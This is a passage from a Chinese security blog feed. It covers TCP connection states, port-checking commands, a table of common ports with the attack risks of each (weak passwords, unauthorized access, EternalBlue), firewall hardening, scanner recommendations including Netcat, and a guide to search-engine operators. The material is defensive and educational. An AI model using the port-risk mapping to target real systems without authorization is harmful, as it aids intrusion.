<h2 id="二、TCP协议详解"><a href="#二、TCP协议详解" class="headerlink" title="二、TCP协议详解"></a>二、TCP协议详解</h2><h3 id="1-TCP三次握手建立连接"><a href="#1-TCP三次握手建立连接" class="headerlink" title="1. TCP三次握手建立连接"></a>1. TCP三次握手建立连接</h3><table>
<thead>
<tr>
<th>步骤</th>
<th>方向</th>
<th>数据包</th>
<th>状态变化</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>第一次</td>
<td>客户端→服务器</td>
<td>[SYN], Seq &#x3D; x</td>
<td>客户端: SYN_SEND</td>
<td>客户端发送SYN包，初始化序列号</td>
</tr>
<tr>
<td>第二次</td>
<td>服务器→客户端</td>
<td>[SYN,ACK], Seq &#x3D; y, ACK &#x3D; x+1</td>
<td>服务器: SYN_RCVD</td>
<td>服务器确认并发送SYN包</td>
</tr>
<tr>
<td>第三次</td>
<td>客户端→服务器</td>
<td>[ACK], ACK &#x3D; y+1</td>
<td>客户端: ESTABLISHED<br>服务器: ESTABLISHED</td>
<td>客户端确认，连接建立</td>
</tr>
</tbody></table>
<h3 id="2-TCP四次挥手断开连接"><a href="#2-TCP四次挥手断开连接" class="headerlink" title="2. TCP四次挥手断开连接"></a>2. TCP四次挥手断开连接</h3><table>
<thead>
<tr>
<th>步骤</th>
<th>方向</th>
<th>数据包</th>
<th>状态变化</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>第一次</td>
<td>客户端→服务器</td>
<td>[FIN]</td>
<td>客户端: FIN_WAIT_1</td>
<td>客户端请求断开连接</td>
</tr>
<tr>
<td>第二次</td>
<td>服务器→客户端</td>
<td>[ACK]</td>
<td>服务器: CLOSE_WAIT<br>客户端: FIN_WAIT_2</td>
<td>服务器确认收到断开请求</td>
</tr>
<tr>
<td>第三次</td>
<td>服务器→客户端</td>
<td>[FIN]</td>
<td>服务器: LAST_ACK<br>客户端: TIME_WAIT</td>
<td>服务器发送断开请求</td>
</tr>
<tr>
<td>第四次</td>
<td>客户端→服务器</td>
<td>[ACK]</td>
<td>服务器: CLOSED<br>客户端: TIME_WAIT</td>
<td>客户端确认，进入等待期</td>
</tr>
</tbody></table>
<h3 id="3-TCP关键状态解析"><a href="#3-TCP关键状态解析" class="headerlink" title="3. TCP关键状态解析"></a>3. TCP关键状态解析</h3><table>
<thead>
<tr>
<th>状态</th>
<th>说明</th>
<th>注意事项</th>
</tr>
</thead>
<tbody><tr>
<td><strong>LISTENING</strong></td>
<td>服务正在监听连接请求</td>
<td>FTP服务启动后首先处于此状态</td>
</tr>
<tr>
<td><strong>ESTABLISHED</strong></td>
<td>连接已建立，正在通信</td>
<td>表示两台机器正在正常通信</td>
</tr>
<tr>
<td><strong>CLOSE_WAIT</strong></td>
<td>对方已关闭连接，等待本端关闭</td>
<td>本端需调用close()关闭连接</td>
</tr>
<tr>
<td><strong>TIME_WAIT</strong></td>
<td>本端主动关闭连接，等待2MSL时间</td>
<td>持续2倍最大分段生存期，防止旧连接影响新连接</td>
</tr>
</tbody></table>
<h2 id="三、端口检测与管理"><a href="#三、端口检测与管理" class="headerlink" title="三、端口检测与管理"></a>三、端口检测与管理</h2><h3 id="1-常用端口检测命令"><a href="#1-常用端口检测命令" class="headerlink" title="1. 常用端口检测命令"></a>1. 常用端口检测命令</h3><h4 id="Windows系统"><a href="#Windows系统" class="headerlink" title="Windows系统"></a>Windows系统</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -ano</span><br><span class="line">netstat -ano | findstr <span class="string">&quot;80&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="Linux系统"><a href="#Linux系统" class="headerlink" title="Linux系统"></a>Linux系统</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netstat -tuln</span><br><span class="line">lsof -i :80</span><br><span class="line">ss -tuln</span><br></pre></td></tr></table></figure>

<h3 id="2-netstat命令详解"><a href="#2-netstat命令详解" class="headerlink" title="2. netstat命令详解"></a>2. netstat命令详解</h3><table>
<thead>
<tr>
<th>参数</th>
<th>功能</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>-a</code></td>
<td>显示所有连接和侦听端口</td>
<td>包含已建立和等待连接</td>
</tr>
<tr>
<td><code>-b</code></td>
<td>显示创建连接的可执行程序</td>
<td>可能需要管理员权限</td>
</tr>
<tr>
<td><code>-n</code></td>
<td>以数字形式显示地址和端口</td>
<td>避免DNS解析，显示更快</td>
</tr>
<tr>
<td><code>-o</code></td>
<td>显示进程ID(PID)</td>
<td>用于关联进程与端口</td>
</tr>
<tr>
<td><code>-p proto</code></td>
<td>指定协议</td>
<td>proto: TCP, UDP, TCPv6, UDPv6</td>
</tr>
<tr>
<td><code>-r</code></td>
<td>显示路由表</td>
<td>显示网络路由信息</td>
</tr>
<tr>
<td><code>-s</code></td>
<td>按协议统计</td>
<td>显示各协议的统计信息</td>
</tr>
</tbody></table>
<h2 id="四、常见端口参考表"><a href="#四、常见端口参考表" class="headerlink" title="四、常见端口参考表"></a>四、常见端口参考表</h2><h3 id="1-Web服务类端口"><a href="#1-Web服务类端口" class="headerlink" title="1. Web服务类端口"></a>1. Web服务类端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>协议</th>
<th>用途</th>
<th>安全风险</th>
</tr>
</thead>
<tbody><tr>
<td>80</td>
<td>HTTP</td>
<td>TCP</td>
<td>Web服务</td>
<td>XSS、SQL注入等Web漏洞</td>
</tr>
<tr>
<td>80-89</td>
<td>HTTP</td>
<td>TCP</td>
<td>备用Web服务</td>
<td>同上</td>
</tr>
<tr>
<td>443</td>
<td>HTTPS</td>
<td>TCP</td>
<td>加密Web服务</td>
<td>SSL&#x2F;TLS漏洞、心脏滴血</td>
</tr>
<tr>
<td>8000-9090</td>
<td>HTTP</td>
<td>TCP</td>
<td>备用Web服务</td>
<td>管理后台常在此范围</td>
</tr>
<tr>
<td>8080</td>
<td>HTTP</td>
<td>TCP</td>
<td>Tomcat&#x2F;WDCP</td>
<td>默认弱口令</td>
</tr>
<tr>
<td>8089</td>
<td>HTTP</td>
<td>TCP</td>
<td>JBOSS</td>
<td>默认弱口令、反序列化</td>
</tr>
<tr>
<td>8888</td>
<td>HTTP</td>
<td>TCP</td>
<td>amh&#x2F;LuManager</td>
<td>主机管理系统</td>
</tr>
</tbody></table>
<h3 id="2-数据库服务类端口"><a href="#2-数据库服务类端口" class="headerlink" title="2. 数据库服务类端口"></a>2. 数据库服务类端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>协议</th>
<th>用途</th>
<th>安全风险</th>
</tr>
</thead>
<tbody><tr>
<td>1433</td>
<td>MSSQL</td>
<td>TCP</td>
<td>Microsoft SQL Server</td>
<td>弱口令、SQL注入</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
<td>TCP</td>
<td>Oracle数据库</td>
<td>弱口令、默认账户</td>
</tr>
<tr>
<td>3306</td>
<td>MySQL</td>
<td>TCP</td>
<td>MySQL数据库</td>
<td>弱口令、未授权访问</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL</td>
<td>TCP</td>
<td>PostgreSQL数据库</td>
<td>弱口令、配置错误</td>
</tr>
<tr>
<td>27017-27018</td>
<td>MongoDB</td>
<td>TCP</td>
<td>MongoDB数据库</td>
<td>未授权访问</td>
</tr>
</tbody></table>
<h3 id="3-特殊服务类端口"><a href="#3-特殊服务类端口" class="headerlink" title="3. 特殊服务类端口"></a>3. 特殊服务类端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>协议</th>
<th>用途</th>
<th>安全风险</th>
</tr>
</thead>
<tbody><tr>
<td>445</td>
<td>SMB</td>
<td>TCP</td>
<td>Windows文件共享</td>
<td>永恒之蓝等漏洞</td>
</tr>
<tr>
<td>6379</td>
<td>Redis</td>
<td>TCP</td>
<td>Redis缓存服务</td>
<td>未授权访问、RCE</td>
</tr>
<tr>
<td>873</td>
<td>Rsync</td>
<td>TCP</td>
<td>文件同步服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>9200-9300</td>
<td>Elasticsearch</td>
<td>TCP</td>
<td>搜索引擎服务</td>
<td>命令执行漏洞</td>
</tr>
<tr>
<td>11211</td>
<td>Memcached</td>
<td>TCP</td>
<td>缓存服务</td>
<td>未授权访问</td>
</tr>
<tr>
<td>5984</td>
<td>CouchDB</td>
<td>TCP</td>
<td>NoSQL数据库</td>
<td>未授权访问</td>
</tr>
<tr>
<td>7001-7002</td>
<td>WebLogic</td>
<td>TCP</td>
<td>Java应用服务器</td>
<td>默认弱口令、反序列化</td>
</tr>
</tbody></table>
<h3 id="4-常用管理类端口"><a href="#4-常用管理类端口" class="headerlink" title="4. 常用管理类端口"></a>4. 常用管理类端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>协议</th>
<th>用途</th>
<th>安全风险</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>FTP</td>
<td>TCP</td>
<td>文件传输</td>
<td>弱口令、匿名访问</td>
</tr>
<tr>
<td>22</td>
<td>SSH</td>
<td>TCP</td>
<td>安全远程登录</td>
<td>弱口令、暴力破解</td>
</tr>
<tr>
<td>23</td>
<td>Telnet</td>
<td>TCP</td>
<td>远程登录</td>
<td>明文传输、弱口令</td>
</tr>
<tr>
<td>3389</td>
<td>RDP</td>
<td>TCP</td>
<td>Windows远程桌面</td>
<td>弱口令、爆破</td>
</tr>
<tr>
<td>5900</td>
<td>VNC</td>
<td>TCP</td>
<td>远程桌面控制</td>
<td>弱口令、未授权访问</td>
</tr>
<tr>
<td>10000</td>
<td>Webmin</td>
<td>TCP</td>
<td>服务器管理</td>
<td>默认弱口令</td>
</tr>
<tr>
<td>50000</td>
<td>SAP</td>
<td>TCP</td>
<td>企业资源计划</td>
<td>命令执行漏洞</td>
</tr>
</tbody></table>
<h3 id="5-其他重要端口"><a href="#5-其他重要端口" class="headerlink" title="5. 其他重要端口"></a>5. 其他重要端口</h3><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>协议</th>
<th>用途</th>
<th>安全风险</th>
</tr>
</thead>
<tbody><tr>
<td>53</td>
<td>DNS</td>
<td>UDP&#x2F;TCP</td>
<td>域名解析</td>
<td>DNS劫持、缓存投毒</td>
</tr>
<tr>
<td>161</td>
<td>SNMP</td>
<td>UDP</td>
<td>网络管理</td>
<td>信息泄露、未授权访问</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
<td>TCP</td>
<td>目录服务</td>
<td>信息泄露</td>
</tr>
<tr>
<td>4440</td>
<td>Rundeck</td>
<td>TCP</td>
<td>任务调度</td>
<td>未授权访问</td>
</tr>
<tr>
<td>6082</td>
<td>Varnish</td>
<td>TCP</td>
<td>Web加速</td>
<td>未授权访问、网站篡改</td>
</tr>
<tr>
<td>8649</td>
<td>Ganglia</td>
<td>TCP</td>
<td>监控系统</td>
<td>信息泄露</td>
</tr>
</tbody></table>
<h2 id="五、端口安全建议"><a href="#五、端口安全建议" class="headerlink" title="五、端口安全建议"></a>五、端口安全建议</h2><ol>
<li><p><strong>最小化原则</strong>：</p>
<ul>
<li>只开放必要的端口</li>
<li>关闭非必要服务</li>
</ul>
</li>
<li><p><strong>安全配置</strong>：</p>
<ul>
<li>为管理端口设置强密码</li>
<li>限制访问IP范围</li>
<li>使用防火墙规则控制访问</li>
</ul>
</li>
<li><p><strong>定期检测</strong>：</p>
<ul>
<li>使用端口扫描工具定期检查开放端口</li>
<li>及时修补已知漏洞</li>
<li>监控异常连接</li>
</ul>
</li>
<li><p><strong>特殊端口处理</strong>：</p>
<ul>
<li>Web管理后台避免使用默认端口</li>
<li>敏感服务（如数据库）不应直接暴露在公网</li>
<li>使用跳板机访问内部服务</li>
</ul>
</li>
<li><p><strong>渗透测试注意事项</strong>：</p>
<ul>
<li>在授权范围内进行端口扫描</li>
<li>避免对关键服务进行暴力测试</li>
<li>遵守相关法律法规和道德规范</li>
</ul>
</li>
</ol>
<h2 id="六、端口扫描工具推荐"><a href="#六、端口扫描工具推荐" class="headerlink" title="六、端口扫描工具推荐"></a>六、端口扫描工具推荐</h2><table>
<thead>
<tr>
<th>工具</th>
<th>类型</th>
<th>特点</th>
<th>适用场景</th>
</tr>
</thead>
<tbody><tr>
<td>Nmap</td>
<td>命令行</td>
<td>功能强大，支持多种扫描技术</td>
<td>专业渗透测试</td>
</tr>
<tr>
<td>Masscan</td>
<td>命令行</td>
<td>速度极快，可全网扫描</td>
<td>大规模网络扫描</td>
</tr>
<tr>
<td>Zenmap</td>
<td>GUI</td>
<td>Nmap的图形界面，易于使用</td>
<td>初学者使用</td>
</tr>
<tr>
<td>Angry IP Scanner</td>
<td>GUI</td>
<td>简单易用，跨平台</td>
<td>快速网络扫描</td>
</tr>
<tr>
<td>Netcat</td>
<td>命令行</td>
<td>“网络瑞士军刀”，多功能</td>
<td>网络调试与测试</td>
</tr>
</tbody></table>
<h2 id="七、端口安全加固示例"><a href="#七、端口安全加固示例" class="headerlink" title="七、端口安全加固示例"></a>七、端口安全加固示例</h2><h3 id="1-关闭不必要端口（Linux）"><a href="#1-关闭不必要端口（Linux）" class="headerlink" title="1. 关闭不必要端口（Linux）"></a>1. 关闭不必要端口（Linux）</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看监听端口</span></span><br><span class="line"><span class="built_in">sudo</span> netstat -tuln</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭特定端口（例如111端口）</span></span><br><span class="line"><span class="built_in">sudo</span> ufw deny 111</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用iptables</span></span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -p tcp --dport 111 -j DROP</span><br><span class="line"><span class="built_in">sudo</span> iptables -A INPUT -p udp --dport 111 -j DROP</span><br></pre></td></tr></table></figure>

<h3 id="2-限制访问IP（Windows）"><a href="#2-限制访问IP（Windows）" class="headerlink" title="2. 限制访问IP（Windows）"></a>2. 限制访问IP（Windows）</h3><ol>
<li>打开”高级安全Windows防火墙”</li>
<li>选择”入站规则”</li>
<li>找到对应服务的规则</li>
<li>右键选择”属性”</li>
<li>在”作用域”选项卡中，添加允许的IP地址</li>
</ol>
<h3 id="3-服务安全配置"><a href="#3-服务安全配置" class="headerlink" title="3. 服务安全配置"></a>3. 服务安全配置</h3><ul>
<li><p><strong>SSH服务</strong>：</p>
<ul>
<li>禁用root远程登录</li>
<li>使用密钥认证代替密码</li>
<li>限制访问IP范围</li>
</ul>
</li>
<li><p><strong>Web服务</strong>：</p>
<ul>
<li>使用HTTPS代替HTTP</li>
<li>配置安全头（如CSP、HSTS）</li>
<li>限制管理后台访问IP</li>
</ul>
</li>
</ul>
<hr>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>端口协议</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器搜索指令大全</title>
    <url>/2025/12/28/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%90%9C%E7%B4%A2%E6%8C%87%E4%BB%A4%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<h2 id="一、通用浏览器搜索指令"><a href="#一、通用浏览器搜索指令" class="headerlink" title="一、通用浏览器搜索指令"></a>一、通用浏览器搜索指令</h2><h3 id="1-基础操作符"><a href="#1-基础操作符" class="headerlink" title="1. 基础操作符"></a>1. 基础操作符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;          # 精确匹配短语</span><br><span class="line">-           # 排除关键词</span><br><span class="line">*           # 通配符（替代任意字符）</span><br><span class="line">OR          # 逻辑或（必须大写）</span><br><span class="line">AND         # 逻辑与（通常空格即可）</span><br><span class="line">()          # 逻辑分组</span><br></pre></td></tr></table></figure>

<h3 id="2-位置限定操作符"><a href="#2-位置限定操作符" class="headerlink" title="2. 位置限定操作符"></a>2. 位置限定操作符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">intitle:    # 标题中包含关键词</span><br><span class="line">allintitle: # 所有关键词都在标题中</span><br><span class="line">inurl:      # URL中包含关键词</span><br><span class="line">allinurl:   # 所有关键词都在URL中</span><br><span class="line">intext:     # 正文中包含关键词</span><br><span class="line">allintext:  # 所有关键词都在正文中</span><br></pre></td></tr></table></figure>

<h3 id="3-站点与文件操作符"><a href="#3-站点与文件操作符" class="headerlink" title="3. 站点与文件操作符"></a>3. 站点与文件操作符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">site:       # 限定特定网站或域名</span><br><span class="line">filetype:   # 限定文件类型</span><br><span class="line">related:    # 查找相关网站（Google特有）</span><br><span class="line">link:       # 查找链接到指定页面的链接（Google特有）</span><br><span class="line">cache:      # 查看Google缓存版本（Google特有）</span><br><span class="line">info:       # 获取页面基本信息（Google特有）</span><br></pre></td></tr></table></figure>

<h3 id="4-特殊符号操作符"><a href="#4-特殊符号操作符" class="headerlink" title="4. 特殊符号操作符"></a>4. 特殊符号操作符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@           # 搜索社交媒体用户名</span><br><span class="line">#           # 搜索话题标签</span><br><span class="line">$           # 搜索价格</span><br><span class="line">..          # 数值范围</span><br><span class="line">define:     # 查找定义（Google特有）</span><br><span class="line">weather:    # 查询天气</span><br><span class="line">stocks:     # 查询股票</span><br></pre></td></tr></table></figure>

<h2 id="二、搜索引擎特有指令"><a href="#二、搜索引擎特有指令" class="headerlink" title="二、搜索引擎特有指令"></a>二、搜索引擎特有指令</h2><h3 id="1-Google特有指令"><a href="#1-Google特有指令" class="headerlink" title="1. Google特有指令"></a>1. Google特有指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 缓存与信息</span><br><span class="line">cache:URL                 # 查看Google缓存的页面</span><br><span class="line">info:URL                  # 获取Google对URL的特定信息</span><br><span class="line"></span><br><span class="line"># 高级内容限定</span><br><span class="line">allinanchor:&quot;文本&quot;        # 所有关键词必须出现在链接锚文本</span><br><span class="line">allinpostauthor:&quot;作者&quot;    # 搜索特定博客作者的帖子</span><br><span class="line">allintext:&quot;关键词&quot;        # 所有关键词必须出现在正文中</span><br><span class="line"></span><br><span class="line"># 精确时间控制</span><br><span class="line">after:2024-01-01 before:2024-12-31  # 精确日期范围</span><br></pre></td></tr></table></figure>

<h3 id="2-Bing特有指令"><a href="#2-Bing特有指令" class="headerlink" title="2. Bing特有指令"></a>2. Bing特有指令</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 位置服务</span><br><span class="line">ip:IP地址                 # 按服务器IP地址搜索</span><br><span class="line">feed:URL                  # 搜索特定RSS/Atom源</span><br><span class="line">hasfeed:域名              # 搜索有RSS源的网站</span><br><span class="line">near:&quot;地标&quot;               # 附近地点搜索</span><br><span class="line"></span><br><span class="line"># 媒体搜索</span><br><span class="line">filetype: 类型            # 但支持更多媒体类型参数</span><br></pre></td></tr></table></figure>

<h3 id="3-百度搜索特点"><a href="#3-百度搜索特点" class="headerlink" title="3. 百度搜索特点"></a>3. 百度搜索特点</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 百度支持的标准指令</span><br><span class="line">site:域名                 # 站内搜索</span><br><span class="line">filetype:类型             # 文件类型搜索</span><br><span class="line">intitle:关键词            # 标题搜索</span><br><span class="line">inurl:关键词              # URL搜索</span><br><span class="line">intext:关键词             # 正文包含</span><br><span class="line">-关键词                   # 排除关键词</span><br><span class="line">&quot;精确匹配&quot;                # 精确短语搜索</span><br><span class="line"></span><br><span class="line"># 百度不支持的Google特有指令</span><br><span class="line">❌ 不支持 related:</span><br><span class="line">❌ 不支持 link: (完整功能)</span><br><span class="line">❌ 不支持 allin* 系列指令</span><br><span class="line">❌ 不支持 after:/before: 精确日期语法</span><br><span class="line">❌ 不支持 define:</span><br></pre></td></tr></table></figure>

<h3 id="4-各搜索引擎支持情况"><a href="#4-各搜索引擎支持情况" class="headerlink" title="4. 各搜索引擎支持情况"></a>4. 各搜索引擎支持情况</h3><table>
<thead>
<tr>
<th>指令</th>
<th>Google</th>
<th>Bing</th>
<th>百度</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>site:</code></td>
<td>✓</td>
<td>✓</td>
<td>✓</td>
<td>三大引擎都支持</td>
</tr>
<tr>
<td><code>filetype:</code></td>
<td>✓</td>
<td>✓</td>
<td>✓</td>
<td>都支持，格式支持有差异</td>
</tr>
<tr>
<td><code>intitle:</code></td>
<td>✓</td>
<td>✓*</td>
<td>✓</td>
<td>*Bing用<code>title:</code>语法</td>
</tr>
<tr>
<td><code>inurl:</code></td>
<td>✓</td>
<td>✓*</td>
<td>✓</td>
<td>*Bing用<code>url:</code>语法</td>
</tr>
<tr>
<td><code>intext:</code></td>
<td>✓</td>
<td>✗</td>
<td>✓</td>
<td>Bing不支持此语法</td>
</tr>
<tr>
<td><code>-</code>排除</td>
<td>✓</td>
<td>✓</td>
<td>✓</td>
<td>基础功能都支持</td>
</tr>
<tr>
<td><code>&quot;&quot;</code>精确匹配</td>
<td>✓</td>
<td>✓</td>
<td>✓</td>
<td>基础功能都支持</td>
</tr>
<tr>
<td><code>OR</code>&#x2F;&#96;</td>
<td>&#96;</td>
<td>✓</td>
<td>✓</td>
<td>|</td>
</tr>
<tr>
<td><code>*</code>通配符</td>
<td>✓</td>
<td>✓</td>
<td>✓</td>
<td>支持程度有差异</td>
</tr>
<tr>
<td><code>cache:</code></td>
<td>✓</td>
<td>✗</td>
<td>✗</td>
<td>Google特有</td>
</tr>
<tr>
<td><code>related:</code></td>
<td>✓</td>
<td>有限</td>
<td>✗</td>
<td>Google特有</td>
</tr>
<tr>
<td><code>link:</code></td>
<td>✓</td>
<td>有限</td>
<td>有限</td>
<td>Google支持最完整</td>
</tr>
</tbody></table>
<h2 id="三、进阶搜索组合技巧"><a href="#三、进阶搜索组合技巧" class="headerlink" title="三、进阶搜索组合技巧"></a>三、进阶搜索组合技巧</h2><h3 id="1-逻辑组合语法"><a href="#1-逻辑组合语法" class="headerlink" title="1. 逻辑组合语法"></a>1. 逻辑组合语法</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础逻辑组合</span><br><span class="line">(A AND B) OR (C AND D)</span><br><span class="line">&quot;(精确短语1)&quot; OR &quot;(精确短语2)&quot;</span><br><span class="line">A -B -C  # 包含A，排除B和C</span><br><span class="line"></span><br><span class="line"># 复杂逻辑嵌套</span><br><span class="line">((A OR B) AND (C OR D)) -E -F</span><br><span class="line">(intitle:X OR inurl:Y) AND (filetype:pdf OR filetype:doc)</span><br></pre></td></tr></table></figure>

<h3 id="2-多条件位置限定"><a href="#2-多条件位置限定" class="headerlink" title="2. 多条件位置限定"></a>2. 多条件位置限定</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 标题+URL+内容三重限定</span><br><span class="line">allintitle:&quot;年度报告&quot; inurl:2024 intext:&quot;财务数据&quot; -intext:广告</span><br><span class="line"></span><br><span class="line"># 多位置条件组合</span><br><span class="line">(intitle:A OR intitle:B) AND (inurl:C OR inurl:D) AND (intext:E OR intext:F)</span><br></pre></td></tr></table></figure>

<h3 id="3-站点与文件类型组合"><a href="#3-站点与文件类型组合" class="headerlink" title="3. 站点与文件类型组合"></a>3. 站点与文件类型组合</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 多站点+多文件类型</span><br><span class="line">(A OR B) (site:X.com OR site:Y.org) (filetype:pdf OR filetype:docx)</span><br><span class="line"></span><br><span class="line"># 站点层级+文件类型</span><br><span class="line">site:.edu.cn OR site:.ac.cn &quot;学术论文&quot; filetype:pdf</span><br></pre></td></tr></table></figure>

<h3 id="4-时间与质量优化"><a href="#4-时间与质量优化" class="headerlink" title="4. 时间与质量优化"></a>4. 时间与质量优化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 时效性控制</span><br><span class="line">关键词 after:2024-01-01 OR (2024..2024)</span><br><span class="line"></span><br><span class="line"># 质量提升</span><br><span class="line">关键词 (site:gov.cn OR site:edu.cn) -advertisement -spam</span><br><span class="line"></span><br><span class="line"># 多维度验证</span><br><span class="line">搜索组1: (核心词) site:权威源1</span><br><span class="line">搜索组2: (核心词) site:权威源2</span><br><span class="line">搜索组3: (核心词) site:权威源3</span><br></pre></td></tr></table></figure>

<h2 id="四、通用搜索场景实战"><a href="#四、通用搜索场景实战" class="headerlink" title="四、通用搜索场景实战"></a>四、通用搜索场景实战</h2><h3 id="1-学术研究场景"><a href="#1-学术研究场景" class="headerlink" title="1. 学术研究场景"></a>1. 学术研究场景</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 论文精准搜索</span><br><span class="line">allintitle:(&quot;deep learning&quot; OR &quot;neural network&quot;) (&quot;medical diagnosis&quot; OR &quot;disease detection&quot;) site:scholar.google.com OR site:arxiv.org filetype:pdf 2020..2024 -survey -review</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 文献综述收集</span><br><span class="line">(&quot;literature review&quot; OR &quot;systematic review&quot;) (&quot;climate change&quot; OR &quot;global warming&quot;) (site:nature.com OR site:science.org) filetype:pdf after:2022-01-01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 作者追踪</span><br><span class="line">author:&quot;Yann LeCun&quot; OR author:&quot;Andrew Ng&quot; (&quot;deep learning&quot; OR &quot;AI&quot;) site:arxiv.org filetype:pdf</span><br></pre></td></tr></table></figure>

<h3 id="2-技术开发场景"><a href="#2-技术开发场景" class="headerlink" title="2. 技术开发场景"></a>2. 技术开发场景</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 开源项目搜索</span><br><span class="line">(&quot;machine learning&quot; OR &quot;AI&quot;) (&quot;open source&quot; OR &quot;GitHub&quot;) stars:&gt;1000 forks:&gt;100 language:Python OR language:JavaScript site:github.com -tutorial -example</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># API文档定位</span><br><span class="line">(&quot;REST API&quot; OR &quot;GraphQL API&quot;) (&quot;authentication&quot; OR &quot;authorization&quot;) (&quot;Python&quot; OR &quot;Node.js&quot;) site:swagger.io OR site:postman.com OR site:rapidapi.com -blog -news</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 错误解决方案</span><br><span class="line">(&quot;TypeError&quot; OR &quot;RuntimeError&quot;) (&quot;Python 3.8&quot; OR &quot;Python 3.9&quot;) (&quot;fix&quot; OR &quot;solution&quot; OR &quot;解决&quot;) site:stackoverflow.com OR site:github.com/issues -ask -question</span><br></pre></td></tr></table></figure>

<h3 id="3-商业分析场景"><a href="#3-商业分析场景" class="headerlink" title="3. 商业分析场景"></a>3. 商业分析场景</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 竞品分析</span><br><span class="line">(&quot;iPhone 15&quot; OR &quot;Samsung S24&quot; OR &quot;Huawei P60&quot;) (&quot;review&quot; OR &quot;comparison&quot; OR &quot;评测&quot; OR &quot;对比&quot;) (site:cnet.com OR site:theverge.com OR site:zealer.com) after:2023-09-01 -buy -purchase -shop</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 市场趋势</span><br><span class="line">(&quot;AI startup&quot; OR &quot;artificial intelligence company&quot;) (&quot;funding&quot; OR &quot;investment&quot; OR &quot;融资&quot; OR &quot;投资&quot;) (China OR Chinese OR 中国) site:crunchbase.com OR site:36kr.com OR site:itjuzi.com 2023..2024</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 用户反馈</span><br><span class="line">(&quot;product feedback&quot; OR &quot;user review&quot; OR &quot;产品反馈&quot; OR &quot;用户体验&quot;) (&quot;mobile app&quot; OR &quot;web application&quot; OR &quot;移动应用&quot; OR &quot;网页应用&quot;) site:appstore.com OR site:coolapk.com OR site:meituan.com -spam -junk</span><br></pre></td></tr></table></figure>

<h3 id="4-新闻与舆情监控"><a href="#4-新闻与舆情监控" class="headerlink" title="4. 新闻与舆情监控"></a>4. 新闻与舆情监控</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 重大事件追踪</span><br><span class="line">(&quot;earthquake&quot; OR &quot;earthquake&quot;) (&quot;casualties&quot; OR &quot;damage&quot; OR &quot;伤亡&quot; OR &quot;损失&quot;) (site:reuters.com OR site:apnews.com OR site:xinhuanet.com) after:2024-12-27 -site:twitter.com -site:weibo.com</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 品牌声誉监控</span><br><span class="line">(&quot;腾讯&quot; OR &quot;Tencent&quot;) (site:weibo.com OR site:zhihu.com OR site:tieba.baidu.com) (-intext:官方 -intext:官网) (intext:投诉 OR intext:问题 OR intext:差评) after:2024-01-01</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 政策影响分析</span><br><span class="line">(&quot;data privacy&quot; OR &quot;privacy law&quot;) (&quot;China&quot; OR &quot;中国&quot;) (&quot;impact&quot; OR &quot;影响&quot;) (site:gov.cn OR site:people.com.cn) after:2023-01-01 filetype:pdf</span><br></pre></td></tr></table></figure>

